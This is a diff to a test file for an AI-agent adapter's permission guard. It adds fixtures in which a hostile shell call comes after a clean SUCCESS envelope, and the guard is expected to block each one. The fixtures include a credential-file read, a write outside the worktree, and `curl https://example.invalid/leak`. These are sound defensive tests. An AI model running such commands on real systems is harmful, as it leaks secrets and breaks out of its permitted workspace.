@@ -23,7 +23,9 @@
  * Git-write denial (owner decision 25), so each category also has a hostile command chained with a Git write that ends
  * `PERMISSION_BLOCKED` at exit 0 and at exit 1 with no provider report. The guard sees the command only under the
  * `command` parameter key, which is hypothetical (adapter.ts `parseEvent`); without the Git write the same stream
- * ends `ok` (pinned in `antigravity.test.ts`).
+ * ends `ok` (pinned in `antigravity.test.ts`). The streams "after the result line" put the same hostile call after a
+ * clean `SUCCESS` envelope (an order not recorded, as Grok Build, Cursor and OpenCode): a trailing tool call is never a
+ * success, and the Git write keeps the guard's `PERMISSION_BLOCKED`.
  */
 
 import { AntigravityAdapter } from "../../../src/adapters/antigravity/adapter.js";
@@ -125,6 +127,23 @@ const guarded = (name: string, category: HostileStream["category"], command: str
     INIT,
     ...shell(`${command} && ${GIT_WRITE}`),
     ...(exitCode === 0 ? [CLEAN_RESULT] : []),
+  ],
+});
+
+/**
+ * Hypothetical order (fail closed): a hostile tool step after the `SUCCESS` envelope. `result` was the last line of
+ * the recorded stream (C4), so a later tool call is never a success, and the guard verdict on it keeps its own code.
+ */
+const trailing = (name: string, category: HostileStream["category"], command: string, exitCode: number) => ({
+  name: `${name} after the result line${exitCode === 0 ? "" : `, exit ${exitCode}`}`,
+  category,
+  exitCode,
+  failureCode: "PERMISSION_BLOCKED" as const,
+  lines: [
+    META(`${name} chained with a Git write after the SUCCESS envelope`, exitCode),
+    INIT,
+    CLEAN_RESULT,
+    ...toolStep(2, "run_command", { command: `${command} && ${GIT_WRITE}` }),
   ],
 });
 
@@ -243,6 +262,9 @@ const antigravityCase: AdapterLegCase = {
       guarded("shell write outside the worktree", "out_of_worktree_write", `touch ${fx.outsideSentinel}`, exit),
       guarded("shell network call", "network", "curl https://example.invalid/leak", exit),
     ]),
+    trailing("shell read of a credential path", "credential_read", `cat ${fx.codexAuthPath}`, 0),
+    trailing("shell write outside the worktree", "out_of_worktree_write", `touch ${fx.outsideSentinel}`, 0),
+    trailing("shell network call", "network", "curl https://example.invalid/leak", 1),
     {
       name: "only unknown event kinds, clean exit",
       category: "unknown_events",
